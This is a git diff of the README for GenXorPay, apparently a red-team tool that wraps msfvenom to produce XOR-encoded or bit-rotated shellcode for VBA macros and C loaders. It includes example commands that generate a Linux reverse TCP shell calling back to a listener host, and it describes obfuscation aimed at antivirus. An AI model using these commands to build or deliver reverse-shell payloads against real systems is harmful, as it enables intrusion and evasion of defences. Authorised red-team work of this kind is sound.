@@ -1,4 +1,4 @@
-# genxorpay
+# GenXorPay
 (Generate XOR Payload) is a command-line tool built to simplify the creation of XOR-encoded shellcode using msfvenom, optimized for VBA macro delivery in offensive security engagements and red team operations. 
 
 ![Platform](https://img.shields.io/badge/platform-linux%20%7C%20macOS-brightgreen?style=flat-square)
@@ -7,18 +7,21 @@
 ---
 ### 🔥 Features
 - ✅ Supports a wide range of **Meterpreter** and **Shell** payloads
-- ✅ Auto-generates **VBA macro stubs** with XOR-decoded shellcode
-- ✅ Saves raw `msfvenom` output and encoded buffers for analysis or reuse
-- ✅ Optional **interactive clipboard mode** to quickly copy payloads, shellcode, or listener setup
-- ✅ Automatically detects payload types and adjusts output (e.g., `.exe` for unsupported VBA payloads)
-- ✅ Fully compatible with **Windows**, **Linux**, **macOS**, and **Android** payloads
-- ✅ Debug log generation for reproducibility and audits
+- ✅ Auto-generates **XOR-encoded** or **bit-rotated** shellcode in C or VBA macro format
+- ✅ Smart encoder prompting — skipped when XOR or rotation is used
+- ✅ Saves raw `msfvenom` output and encoded buffers for reuse or analysis
+- ✅ Optional **interactive clipboard mode** to copy payloads, shellcode, and MSF listener commands
+- ✅ Detects and adjusts output types automatically (`.exe`, `.vba`, `.c`, `.elf`)
+- ✅ Works across **Windows**, **Linux**, **macOS**, **Android**, **PHP**, **Java**, **Python**
+- ✅ Includes built-in **bit-rotation encoding** with `--rotate`
+- ✅ Suggested GCC compilation commands for Linux C payloads
+- ✅ Debug logging support (`--debug`) for reproducibility
 
 ---
 ### 🔌 Clone the Repository
 
 ```bash
-git clone https://github.com/yourname/genxorpay.git
+git clone https://github.com/Ninjarku/genxorpay.git
 cd genxorpay
 chmod +x genxorpay.sh
 
@@ -41,6 +44,24 @@ This will:
 - Enter interactive mode for copying payload elements to clipboard
 
 ----
+
+### 🐧 Linux Payload with C Decoder
+```bash
+./genxorpay.sh -p 13 -lhost 192.168.1.100 -lport 4444 --arch x64 --platform linux --format c -key 0x41 -o xor.c
+```
+- Generate Linux x64 shell_reverse_tcp
+- Applies XOR encoding
+- Outputs a C file (xor.c) that decodes and executes the shellcode (You will still need to compile it to run)
+
+----
+### 🔁 Bit-Rotation Example (Instead of XOR)
+```bash
+./genxorpay.sh -p 13 -lhost 192.168.1.100 -lport 4444 --arch x64 --platform linux --format c --rotate 3 -o rotate.c
+```
+- Rotates shellcode left by 3 bits
+- C file includes reverse decoder logic (right rotation by 3 bits)
+
+----
 ### 🎯 Intended Use
 
 `genxorpay` is designed for:
@@ -53,21 +74,11 @@ This will:
 
 # TODO
 ### (Future To-Do)
-- -e encoder and --iterations support for msfvenom
-
-- Add --format or --binary override
-
 - Add --test mode to auto-run payload in sandbox
-
 - Add optional --encode-only mode for custom shellcode
-
 - Handle msfvenom failure with --debug output
-
 - Add integrity check of output bytes (e.g., checksum)
-
 - Include SHA256 of output payloads in log (For hash checks on AV)
-
-- Add --staged, --stageless, or --arch=x86/x64 options
 
 ### 🤝 Contributions
 Contributions, ideas, and pull requests are welcome. Please file an issue if you discover a bug or want to propose a feature.
